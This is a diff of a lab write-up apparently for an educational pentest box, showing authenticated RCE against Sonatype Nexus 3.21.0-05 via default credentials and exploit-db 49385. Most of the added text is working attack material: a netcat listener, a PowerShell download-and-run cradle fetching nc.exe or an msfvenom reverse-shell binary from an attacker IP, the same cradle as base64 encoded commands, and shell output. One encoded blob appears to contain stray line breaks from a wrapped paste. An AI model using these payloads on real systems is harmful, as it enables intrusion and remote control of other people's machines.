@@ -1,5 +1,11 @@
 This lab involves exploiting Sonatype Nexus 3.21.0-05 for authenticated remote code execution and using the SMBGhost vulnerability to escalate privileges. Learners will craft payloads to gain initial access and leverage an unpatched SMB service to obtain a SYSTEM shell. The lab highlights web application vulnerabilities and critical privilege escalation techniques.
 
+- Enumerate services to identify the Sonatype Nexus application on port 8081 and confirm its version.
+- Use default credentials to access the application and execute commands to deploy a reverse shell.
+- Analyze installed patches and running services to confirm vulnerability to SMBGhost (CVE-2020-0796).
+- Deploy a custom SMBGhost exploit to elevate privileges to SYSTEM.
+- Understand the importance of patching critical vulnerabilities and securing default credentials.
+
 ok lets get crackin
 
 ```
@@ -89,12 +95,101 @@ now we can use this RCE auth'd vuln
 
 https://www.exploit-db.com/exploits/49385
 
+
+```bash
+# on attacker
+ip a|grep 192
+nc -nvlp 4444
+```
+
 ```python
-# 49385.py
+# 49385.py start of file
 
 URL='http://BILLYBOSS:8081'
-CMD='cmd.exe /c calc.exe'
+CMD = 'powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe; C:\\Windows\\Temp\\nc.exe 192.168.49.51 4444 -e cmd.exe"'
 USERNAME='nexus'
 PASSWORD='nexus'
 
+```
+
+ Option A — PowerShell download cradle (nc.exe)                                                                               
+                                                                                                                              
+ 1. Copy nc.exe to your serving dir and start a web server:                                                                   
+```
+cp /usr/share/windows-binaries/nc.exe .
+python3 -m http.server 80
+```
+                
+1. Start your listener: `nc -lvnp 4444`
+2. Update the script: 
+
+```
+CMD = 'powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe; C:\\Windows\\Temp\\nc.exe 192.168.49.51 4444 -e cmd.exe"'
+```
+
+```
+ echo -n 'Invoke-WebRequest -Uri http://192.168.49.51/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe        
+ 192.168.49.51 4444 -e cmd.exe' | iconv -t UTF-16LE | base64 -w 0
+```
+
+output:
+
+```
+SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAG4AYwAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAACgBjAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAAoAYwAuAGUAeABlACAAIAAgACAAIAAKACAAIAAxADkAMgAuADEANgA4AC4ANAA5AC4ANQAxACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA
+```
+
+
+```
+CMD = 'powershell -EncodedCommand <PASTE_BASE64_HERE>'
+
+
+CMD = 'powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAG4AYwAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAACgBjAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAAoAYwAuAGUAeABlACAAIAAgACAAIAAKACAAIAAxADkAMgAuADEANgA4AC4ANAA5AC4ANQAxACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA'
+```
+
+```sh
+echo -n 'ping -n 1 192.168.49.51' | iconv -t UTF-16LE | base64 -w 0
+
+# cABpAG4AZwAgAC0AbgAgADEAIAAxADkAMgAuADEANgA4AC4ANAA5AC4ANQAxAA==
+
+sudo tcpdump -i any icmp
+(ping works)
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=4444 -f exe -o shell.exe
+
+
+echo -n 'Invoke-WebRequest -Uri http://192.168.49.51/shell.exe -OutFile C:\Windows\Temp\s.exe; C:\Windows\Temp\s.exe' | iconv -t UTF-16LE | base64 -w 0
+
+# SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwAuAGUAeABlAA==
+
+# great! we have non-root shell.
+```
+
+working steps:
+
+```sh
+python3 -m http.server 80
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=4444 -f exe -o shell.exe
+
+echo -n 'Invoke-WebRequest -Uri http://192.168.49.51/shell.exe -OutFile C:\Windows\Temp\s.exe; C:\Windows\Temp\s.exe' | iconv -t UTF-16LE | base64 -w 0
+
+# SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwAuAGUAeABlAA==
+
+```
+
+```python
+URL='http://BILLYBOSS:8081'
+CMD = 'powershell -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwAuAGUAeABlAA=="'
+USERNAME='nexus'
+PASSWORD='nexus'
+```
+
+```bash
+python 49385.py
+```
+
+```bash
+C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
+whoami
+billyboss\nathan
 ```
